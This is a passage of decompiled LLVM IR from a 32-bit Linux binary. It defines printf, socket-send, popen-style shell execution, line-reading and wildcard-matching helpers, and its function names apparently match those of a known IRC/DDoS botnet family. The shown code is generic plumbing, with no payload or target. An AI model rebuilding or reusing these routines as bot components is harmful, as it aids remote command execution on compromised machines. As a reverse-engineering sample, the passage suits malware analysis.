  %v3_8048857 = zext i8 %v2_8048857 to i32
  %v4_8048867 = call i32 @printchar(i32* %arg1, i32 %v3_8048857)
  %v4_804886c = add i32 %stack_var_-28.143, 1
  br label %dec_label_pc_804886f

dec_label_pc_804886f:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_804881b, %dec_label_pc_80487ca, %dec_label_pc_8048776, %dec_label_pc_804869c, %dec_label_pc_8048722, %dec_label_pc_80486ce, %dec_label_pc_8048854
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048854 ], [ %stack_var_8.1, %dec_label_pc_8048811 ], [ %stack_var_8.1, %dec_label_pc_804881b ], [ %stack_var_8.1, %dec_label_pc_80487ca ], [ %stack_var_8.1, %dec_label_pc_8048776 ], [ %stack_var_8.1, %dec_label_pc_8048722 ], [ %stack_var_8.1, %dec_label_pc_80486ce ], [ %stack_var_8.1, %dec_label_pc_804869c ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.142, %dec_label_pc_8048854 ], [ %stack_var_12.142, %dec_label_pc_8048811 ], [ %v1_804881e, %dec_label_pc_804881b ], [ %v1_80487cd, %dec_label_pc_80487ca ], [ %v1_8048779, %dec_label_pc_8048776 ], [ %v1_8048725, %dec_label_pc_8048722 ], [ %v1_80486d1, %dec_label_pc_80486ce ], [ %v1_804867a, %dec_label_pc_804869c ]
  %stack_var_-28.0 = phi i32 [ %v4_804886c, %dec_label_pc_8048854 ], [ %stack_var_-28.143, %dec_label_pc_8048811 ], [ %v5_804884f, %dec_label_pc_804881b ], [ %v5_804880c, %dec_label_pc_80487ca ], [ %v5_80487b8, %dec_label_pc_8048776 ], [ %v5_8048764, %dec_label_pc_8048722 ], [ %v5_8048710, %dec_label_pc_80486ce ], [ %v5_80486bc, %dec_label_pc_804869c ]
  %v4_804886f = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804886f = add i32 %v4_804886f, 1
  %stack_var_8.4 = inttoptr i32 %v5_804886f to i8*
  %v2_8048875 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048878 = icmp eq i8 %v2_8048875, 0
  %v1_804887a = icmp eq i1 %v4_8048878, false
  br i1 %v1_804887a, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_804886f, %dec_label_pc_80485e1, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.143, %dec_label_pc_80485e1 ], [ %stack_var_-28.0, %dec_label_pc_804886f ]
  %v4_8048880 = icmp eq i32* %arg1, null
  br i1 %v4_8048880, label %dec_label_pc_804888e, label %dec_label_pc_8048886

dec_label_pc_8048886:                             ; preds = %dec_label_pc_8048880
  %v2_8048889 = load i32, i32* %arg1, align 4
  %v1_804888b = inttoptr i32 %v2_8048889 to i8*
  store i8 0, i8* %v1_804888b, align 1
  br label %dec_label_pc_804888e

dec_label_pc_804888e:                             ; preds = %dec_label_pc_8048880, %dec_label_pc_8048886
  %v2_8048891 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048891, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804886f, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 1, 0, 12 }
  uselistorder i8* %stack_var_8.1, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 16, 15, 13 }
  uselistorder i32 %v5_8048623, { 1, 0 }
  uselistorder i8* %v22_80485e1, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in41, { 1, 0 }
  uselistorder i32 %stack_var_12.142, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.143, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i64, i32, i32, i32, i32, i32)* @printi, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804888e, { 1, 0 }
  uselistorder label %dec_label_pc_804886f, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_804869c, { 1, 0 }
  uselistorder label %dec_label_pc_8048659, { 1, 0 }
  uselistorder label %dec_label_pc_8048623, { 1, 0 }
  uselistorder label %dec_label_pc_80485d3, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048893 = load i32, i32* @ebp, align 4
  store i32 %v0_8048893, i32* %stack_var_-4, align 4
  %v4_8048893 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048893, i32* @ebp, align 4
  %v4_804889c = ptrtoint i32* %stack_var_8 to i32
  %v4_80488b4 = call i32 @print(i32* null, i32 %arg1, i32 %v4_804889c)
  %v2_80488b9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488b9, i32* @ebp, align 4
  ret i32 %v4_80488b4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488bb = load i32, i32* @ebp, align 4
  store i32 %v0_80488bb, i32* %stack_var_-4, align 4
  %v4_80488bb = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80488bb, i32* @ebp, align 4
  %v4_80488c4 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488db = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80488c4)
  %v2_80488e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488e0, i32* @ebp, align 4
  ret i32 %v4_80488db

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e5 = load i32, i32* @edi, align 4
  store i32 %v0_80488e5, i32* %stack_var_-8, align 4
  %v1_80488f0 = call i32 @malloc(i32 2048)
  store i32 %v1_80488f0, i32* %stack_var_-20, align 4
  %v3_8048911 = inttoptr i32 %v1_80488f0 to i8*
  %v4_8048911 = call i32 @__GI_memset(i8* %v3_8048911, i32 0, i32 2048)
  %v4_804891f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048936 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_804891f)
  %v3_804894c = call i32 @_strlen(i8* %v3_8048911)
  %v6_8048953 = add i32 %v1_80488f0, %v3_804894c
  %v1_8048956 = inttoptr i32 %v6_8048953 to i8*
  store i8 10, i8* %v1_8048956, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_80488f0, i32* @edi, align 4
  %v3_804896a = call i32 @_strlen(i8* %v3_8048911)
  %v4_804898a = call i32 @__libc_send(i32 %arg1, i32 %v1_80488f0, i32 %v3_804896a, i32 16384)
  %v1_8048998 = call i32 @free(i32 %v1_80488f0)
  %v0_80489a0 = load i32, i32* @esp, align 4
  %v5_80489a0 = icmp ugt i32 %v0_80489a0, -53
  store i1 %v5_80489a0, i1* @cf, align 1
  %v2_80489a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80489a3, i32* @edi, align 4
  ret i32 %v4_804898a

; uselistorder directives
  uselistorder i32 %v1_80488f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80489a9 = load i32, i32* @edi, align 4
  store i32 %v0_80489a9, i32* %stack_var_-8, align 4
  %v4_80489ad = ptrtoint i8* %arg2 to i32
  %v2_80489b0 = load i8, i8* %arg2, align 1
  %v10_80489b3 = icmp eq i8 %v2_80489b0, 114
  br i1 %v10_80489b3, label %dec_label_pc_80489c1, label %dec_label_pc_80489b7

dec_label_pc_80489b7:                             ; preds = %entry
  %v2_80489ba = load i8, i8* %arg2, align 1
  %v10_80489bd = icmp eq i8 %v2_80489ba, 119
  %v1_80489bf = icmp eq i1 %v10_80489bd, false
  br i1 %v1_80489bf, label %dec_label_pc_8048b83, label %dec_label_pc_80489c1

dec_label_pc_80489c1:                             ; preds = %dec_label_pc_80489b7, %entry
  %v1_80489c4 = add i32 %v4_80489ad, 1
  %v1_80489c5 = inttoptr i32 %v1_80489c4 to i8*
  %v2_80489c5 = load i8, i8* %v1_80489c5, align 1
  %v4_80489c8 = icmp eq i8 %v2_80489c5, 0
  br i1 %v4_80489c8, label %dec_label_pc_80489d8, label %dec_label_pc_8048b83

dec_label_pc_80489d8:                             ; preds = %dec_label_pc_80489c1
  %v2_80489d8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80489de = call i32 @__GI_pipe(i32 %v2_80489d8)
  %v2_80489e3 = icmp slt i32 %v2_80489de, 0
  %v1_80489e5 = icmp eq i1 %v2_80489e3, false
  br i1 %v1_80489e5, label %dec_label_pc_80489f3, label %dec_label_pc_8048b83

dec_label_pc_80489f3:                             ; preds = %dec_label_pc_80489d8
  %v0_80489f3 = load i8*, i8** @global_var_80665a0.13, align 4
  %v2_80489f8 = icmp eq i8* %v0_80489f3, null
  %v1_80489fa = icmp eq i1 %v2_80489f8, false
  br i1 %v1_80489fa, label %bb, label %dec_label_pc_80489fc

dec_label_pc_80489fc:                             ; preds = %dec_label_pc_80489f3
  %v0_80489fc = call i32 @getdtablesize()
  %tmp19 = icmp slt i32 %v0_80489fc, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048a16, label %dec_label_pc_8048b83

dec_label_pc_8048a16:                             ; preds = %dec_label_pc_80489fc
  %v2_8048a19 = mul i32 %v0_80489fc, 4
  %v2_8048a1f = call i32 @malloc(i32 %v2_8048a19)
  %v1_8048a24 = inttoptr i32 %v2_8048a1f to i8*
  store i8* %v1_8048a24, i8** @global_var_80665a0.13, align 32
  %v2_8048a2e = icmp eq i32 %v2_8048a1f, 0
  %v1_8048a30 = icmp eq i1 %v2_8048a2e, false
  br i1 %v1_8048a30, label %dec_label_pc_8048a3e, label %dec_label_pc_8048b83

dec_label_pc_8048a3e:                             ; preds = %dec_label_pc_8048a16
  %v1_8048a41 = mul i32 %v0_80489fc, 4
  store i32 %v2_8048a1f, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048a52 = and i32 %v2_8048a1f, -256
  %v5_8048a54 = call i8* @_memset(i8* %v1_8048a24, i32 %v1_8048a52, i32 %v1_8048a41)
  br label %bb

bb:                                               ; preds = %dec_label_pc_80489f3, %dec_label_pc_8048a3e
  %v1_8048a56 = call i32 @__vfork(i32 %tmp11)
  %v13_8048a64 = icmp eq i32 %v1_8048a56, -1
  br i1 %v13_8048a64, label %dec_label_pc_8048a75, label %dec_label_pc_8048a6a

dec_label_pc_8048a6a:                             ; preds = %bb
  %v4_8048a6a = icmp eq i32 %v1_8048a56, 0
  %v2_8048a9a = load i8, i8* %arg2, align 1
  %v10_8048a9d = icmp eq i8 %v2_8048a9a, 114
  %v1_8048a9f = icmp eq i1 %v10_8048a9d, false
  br i1 %v4_8048a6a, label %dec_label_pc_8048a97, label %dec_label_pc_8048b3b

dec_label_pc_8048a75:                             ; preds = %bb
  %v3_8048a75 = load i32, i32* %stack_var_-24, align 4
  %v2_8048a7b = call i32 @__libc_close(i32 %v3_8048a75)
  %v2_8048a86 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b83

dec_label_pc_8048a97:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048ad4, label %dec_label_pc_8048aa1

dec_label_pc_8048aa1:                             ; preds = %dec_label_pc_8048a97
  %v9_8048aa4 = icmp eq i32 %tmp7, 1
  br i1 %v9_8048aa4, label %dec_label_pc_8048ac7, label %dec_label_pc_8048aa9

dec_label_pc_8048aa9:                             ; preds = %dec_label_pc_8048aa1
  %v4_8048ab7 = call i32 @dup2(i32 %tmp7, i32 1)
  %v2_8048ac2 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048ac7

dec_label_pc_8048ac7:                             ; preds = %dec_label_pc_8048aa1, %dec_label_pc_8048aa9
  %v3_8048ac7 = load i32, i32* %stack_var_-24, align 4
  %v2_8048acd = call i32 @__libc_close(i32 %v3_8048ac7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048ad4:                             ; preds = %dec_label_pc_8048a97
  %v3_8048ad4 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ad7 = icmp eq i32 %v3_8048ad4, 0
  br i1 %v1_8048ad7, label %dec_label_pc_8048af9, label %dec_label_pc_8048adb

dec_label_pc_8048adb:                             ; preds = %dec_label_pc_8048ad4
  %v4_8048ae9 = call i32 @dup2(i32 %v3_8048ad4, i32 0)
  %v3_8048aee = load i32, i32* %stack_var_-24, align 4
  %v2_8048af4 = call i32 @__libc_close(i32 %v3_8048aee)
  br label %dec_label_pc_8048af9

dec_label_pc_8048af9:                             ; preds = %dec_label_pc_8048ad4, %dec_label_pc_8048adb
  %v2_8048aff = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048ac7, %dec_label_pc_8048af9
  %v8_8048b2a = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805752a.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_80571fb.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8057527.14 to i32), i32 %arg1, i32 0)
  %v2_8048b36 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048b3b:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048b58, label %dec_label_pc_8048b45

dec_label_pc_8048b45:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b45 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b51 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b58:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b5e = load i32, i32* %stack_var_-24, align 4
  %v2_8048b64 = call i32 @__libc_close(i32 %v3_8048b5e)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b69:                             ; preds = %dec_label_pc_8048b45, %dec_label_pc_8048b58
  %stack_var_-28.0 = phi i32 [ %tmp7, %dec_label_pc_8048b58 ], [ %v3_8048b45, %dec_label_pc_8048b45 ]
  %v2_8048b6c = mul i32 %stack_var_-28.0, 4
  %v0_8048b71 = load i8*, i8** @global_var_80665a0.13, align 4
  %v1_8048b71 = ptrtoint i8* %v0_8048b71 to i32
  %v2_8048b76 = add i32 %v1_8048b71, %v2_8048b6c
  %v2_8048b7b = inttoptr i32 %v2_8048b76 to i32*
  store i32 %v1_8048a56, i32* %v2_8048b7b, align 4
  br label %dec_label_pc_8048b83

dec_label_pc_8048b83:                             ; preds = %dec_label_pc_8048a16, %dec_label_pc_80489fc, %dec_label_pc_80489d8, %dec_label_pc_80489b7, %dec_label_pc_80489c1, %dec_label_pc_8048a75, %dec_label_pc_8048b69
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048a75 ], [ %stack_var_-28.0, %dec_label_pc_8048b69 ], [ -1, %dec_label_pc_80489c1 ], [ -1, %dec_label_pc_80489b7 ], [ -1, %dec_label_pc_80489d8 ], [ -1, %dec_label_pc_80489fc ], [ -1, %dec_label_pc_8048a16 ]
  %v2_8048b89 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048b89, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048a56, { 1, 2, 0 }
  uselistorder i32 %v0_80489fc, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048b83, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b69, { 1, 0 }
  uselistorder label %dec_label_pc_8048b04, { 1, 0 }
  uselistorder label %dec_label_pc_8048af9, { 1, 0 }
  uselistorder label %dec_label_pc_8048ac7, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b8c = load i32, i32* @ebp, align 4
  store i32 %v0_8048b8c, i32* %stack_var_-4, align 4
  %v0_8048b95 = load i8*, i8** @global_var_80665a0.13, align 4
  %v2_8048b9a = icmp eq i8* %v0_8048b95, null
  br i1 %v2_8048b9a, label %dec_label_pc_8048cf9, label %dec_label_pc_8048b9e

dec_label_pc_8048b9e:                             ; preds = %entry
  %v1_8048b95 = ptrtoint i8* %v0_8048b95 to i32
  %v2_8048ba1 = mul i32 %arg1, 4
  %v2_8048bab = add i32 %v1_8048b95, %v2_8048ba1
  %v1_8048bae = inttoptr i32 %v2_8048bab to i32*
  %v2_8048bae = load i32, i32* %v1_8048bae, align 4
  %v1_8048bb0 = icmp eq i32 %v2_8048bae, 0
  %v1_8048bb2 = icmp eq i1 %v1_8048bb0, false
  br i1 %v1_8048bb2, label %dec_label_pc_8048bc3, label %dec_label_pc_8048cf9

dec_label_pc_8048bc3:                             ; preds = %dec_label_pc_8048b9e
  %v1_8048bc9 = call i32 @__libc_close(i32 %arg1)
  %v2_8048bce = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048bd7 = call i32 @sigemptyset(i32 %v2_8048bce)
  %v2_8048bed = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 2)
  %v2_8048c03 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 3)
  %v2_8048c19 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 1)
  %v4_8048c24 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048c39 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048c39 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048c39, i32 %v4_8048c24)
  %v2_8048c58 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048c3e

dec_label_pc_8048c3e:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048bc3
  %v0_8048c46 = load i8*, i8** @global_var_80665a0.13, align 4
  %v1_8048c46 = ptrtoint i8* %v0_8048c46 to i32
  %v2_8048c4b = add i32 %v1_8048c46, %v2_8048ba1
  %v1_8048c4e = inttoptr i32 %v2_8048c4b to i32*
  %v2_8048c4e = load i32, i32* %v1_8048c4e, align 4
  %v3_8048c65 = call i32 @__libc_waitpid(i32 %v2_8048c4e, i32 %v2_8048c58, i32 0)
  %v13_8048c70 = icmp eq i32 %v3_8048c65, -1
  %v1_8048c77 = icmp eq i1 %v13_8048c70, false
  br i1 %v1_8048c77, label %dec_label_pc_8048c85, label %dec_label_pc_8048c79

dec_label_pc_8048c79:                             ; preds = %dec_label_pc_8048c3e
  %v1_8048c79 = call i32 @__errno_location(i32 %v3_8048c65)
  %v1_8048c7e = inttoptr i32 %v1_8048c79 to i32*
  %v2_8048c7e = load i32, i32* %v1_8048c7e, align 4
  %v9_8048c80 = icmp eq i32 %v2_8048c7e, 4
  br i1 %v9_8048c80, label %dec_label_pc_8048c3e, label %dec_label_pc_8048c85

dec_label_pc_8048c85:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048c3e
  %v13_8048c70.lcssa = phi i1 [ true, %dec_label_pc_8048c79 ], [ false, %dec_label_pc_8048c3e ]
  %v3_8048c9e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048c9e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048c9e, i32 0)
  %v2_8048ca9 = mul i32 %tmp6, 4
  %v0_8048cae = load i8*, i8** @global_var_80665a0.13, align 4
  %v1_8048cae = ptrtoint i8* %v0_8048cae to i32
  %v2_8048cb3 = add i32 %v1_8048cae, %v2_8048ca9
  %v1_8048cb6 = inttoptr i32 %v2_8048cb3 to i32*
  store i32 0, i32* %v1_8048cb6, align 4
  br i1 %v13_8048c70.lcssa, label %dec_label_pc_8048ced, label %dec_label_pc_8048cc5

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c85
  %v3_8048cc5 = load i32, i32* %stack_var_-268, align 4
  %v1_8048cd1 = and i32 %v3_8048cc5, 65280
  %v2_8048cd81 = udiv i32 %v1_8048cd1, 256
  br label %dec_label_pc_8048ced

dec_label_pc_8048ced:                             ; preds = %dec_label_pc_8048c85, %dec_label_pc_8048cc5
  %storemerge2 = phi i32 [ %v2_8048cd81, %dec_label_pc_8048cc5 ], [ -1, %dec_label_pc_8048c85 ]
  %v2_8048cff.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048cf9

dec_label_pc_8048cf9:                             ; preds = %entry, %dec_label_pc_8048b9e, %dec_label_pc_8048ced
  %v2_8048cff = phi i32 [ %v2_8048cff.pre, %dec_label_pc_8048ced ], [ %v0_8048b8c, %dec_label_pc_8048b9e ], [ %v0_8048b8c, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048ced ], [ -1, %dec_label_pc_8048b9e ], [ -1, %entry ]
  store i32 %v2_8048cff, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c65, { 1, 0 }
  uselistorder i32 %v2_8048ba1, { 1, 0 }
  uselistorder i8* %v0_8048b95, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_80665a0.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048cf9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ced, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048d40

dec_label_pc_8048d17:                             ; preds = %dec_label_pc_8048d48
  %v3_8048d2f = inttoptr i32 %v5_8048d4b to i32*
  %v4_8048d2f = call i32 @__libc_read(i32 %arg3, i32* %v3_8048d2f, i32 1)
  %v4_8048d37 = add nuw i32 %storemerge113, 1
  %v8_8048d3a = icmp eq i32 %v4_8048d2f, 0
  %v12_8048d3a = icmp eq i32 %v4_8048d2f, 1
  %v1_8048d3e = icmp eq i1 %v12_8048d3a, false
  br i1 %v1_8048d3e, label %dec_label_pc_8048d56, label %dec_label_pc_8048d40

dec_label_pc_8048d40:                             ; preds = %entry, %dec_label_pc_8048d17
  %v8_8048d3a14 = phi i1 [ false, %entry ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  %storemerge113 = phi i32 [ 0, %entry ], [ %v4_8048d37, %dec_label_pc_8048d17 ]
  %v5_8048d46 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_8048d46, label %dec_label_pc_8048d48, label %dec_label_pc_8048d56

dec_label_pc_8048d48:                             ; preds = %dec_label_pc_8048d40
  %v5_8048d4b = add i32 %storemerge113, %arg1
  %v1_8048d4e = add i32 %v5_8048d4b, -1
  %v1_8048d4f = inttoptr i32 %v1_8048d4e to i8*
  %v2_8048d4f = load i8, i8* %v1_8048d4f, align 1
  %v10_8048d52 = icmp eq i8 %v2_8048d4f, 10
  %v1_8048d54 = icmp eq i1 %v10_8048d52, false
  br i1 %v1_8048d54, label %dec_label_pc_8048d17, label %dec_label_pc_8048d56

dec_label_pc_8048d56:                             ; preds = %dec_label_pc_8048d40, %dec_label_pc_8048d48, %dec_label_pc_8048d17
  %v8_8048d3a.lcssa = phi i1 [ %v8_8048d3a14, %dec_label_pc_8048d40 ], [ %v8_8048d3a14, %dec_label_pc_8048d48 ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  br i1 %v8_8048d3a.lcssa, label %dec_label_pc_8048d6b, label %dec_label_pc_8048d5c

dec_label_pc_8048d5c:                             ; preds = %dec_label_pc_8048d56
  br label %dec_label_pc_8048d6b

dec_label_pc_8048d6b:                             ; preds = %dec_label_pc_8048d56, %dec_label_pc_8048d5c
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d5c ], [ 0, %dec_label_pc_8048d56 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d4b, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_8048d3a14, { 1, 0 }
  uselistorder i1 %v8_8048d3a, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d6b, { 1, 0 }
  uselistorder label %dec_label_pc_8048d56, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d40, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048d9f1 = ptrtoint i8* %arg1 to i32
  %v2_8048da22 = load i8, i8* %arg1, align 1
  %v4_8048da54 = icmp eq i8 %v2_8048da22, 0
  br i1 %v4_8048da54, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048da9
  %v2_8048d84 = mul i32 %stack_var_-8.010, 16
  %v2_8048d8a = load i8, i8* %stack_var_4.011, align 1
  %v3_8048d8a = zext i8 %v2_8048d8a to i32
  %v1_8048d90 = mul nuw nsw i32 %v3_8048d8a, 4
  %v2_8048d90 = add i32 %v1_8048d90, ptrtoint (i32* @global_var_8057540.17 to i32)
  %v3_8048d90 = inttoptr i32 %v2_8048d90 to i32*
  %v4_8048d90 = load i32, i32* %v3_8048d90, align 4
  %v2_8048d97 = or i32 %v4_8048d90, %v2_8048d84
  %v5_8048d9c = add i32 %v4_8048d9f12, 1
  %v22_8048d9c = inttoptr i32 %v5_8048d9c to i8*
  %v2_8048da2 = load i8, i8* %v22_8048d9c, align 1
  %v4_8048da5 = icmp eq i8 %v2_8048da2, 0
  br i1 %v4_8048da5, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048da9:                             ; preds = %entry, %dec_label_pc_8048d7f
  %v4_8048d9f12 = phi i32 [ %v5_8048d9c, %dec_label_pc_8048d7f ], [ %v4_8048d9f1, %entry ]
  %stack_var_4.011 = phi i8* [ %v22_8048d9c, %dec_label_pc_8048d7f ], [ %arg1, %entry ]
  %stack_var_-8.010 = phi i32 [ %v2_8048d97, %dec_label_pc_8048d7f ], [ 0, %entry ]
  %v5_8048da9 = icmp slt i32 %stack_var_-8.010, 0
  %v1_8048dad = icmp eq i1 %v5_8048da9, false
  br i1 %v1_8048dad, label %dec_label_pc_8048d7f, label %dec_label_pc_8048daf

dec_label_pc_8048daf:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048da9, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %v2_8048d97, %dec_label_pc_8048d7f ], [ %stack_var_-8.010, %dec_label_pc_8048da9 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048daf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048da9, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp12 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048db7 = load i32, i32* @ebx, align 4
  store i32 %v0_8048db7, i32* %stack_var_-8, align 4
  %v4_8048dbb = ptrtoint i8* %arg1 to i32
  %v2_8048dbe = load i8, i8* %arg1, align 1
  %v12_8048dc7 = icmp eq i8 %v2_8048dbe, 42
  br i1 %v12_8048dc7, label %dec_label_pc_8048def, label %dec_label_pc_8048dcd

dec_label_pc_8048dcd:                             ; preds = %entry
  %v12_8048dcd = icmp eq i8 %v2_8048dbe, 63
  br i1 %v12_8048dcd, label %dec_label_pc_8048e42, label %dec_label_pc_8048dd3

dec_label_pc_8048dd3:                             ; preds = %dec_label_pc_8048dcd
  %v4_8048dd3 = icmp eq i8 %v2_8048dbe, 0
  br i1 %v4_8048dd3, label %dec_label_pc_8048dde, label %dec_label_pc_8048e7c

dec_label_pc_8048dde:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048de1 = load i8, i8* %tmp12, align 1
  %v3_8048de1 = zext i8 %v2_8048de1 to i32
  br label %dec_label_pc_8048ed2

dec_label_pc_8048def:                             ; preds = %entry
  %v1_8048df2 = add i32 %v4_8048dbb, 1
  %v4_8048dfa = inttoptr i32 %v1_8048df2 to i8*
  %v5_8048dfd = call i32 @wildString(i8* %v4_8048dfa, i32 %arg2)
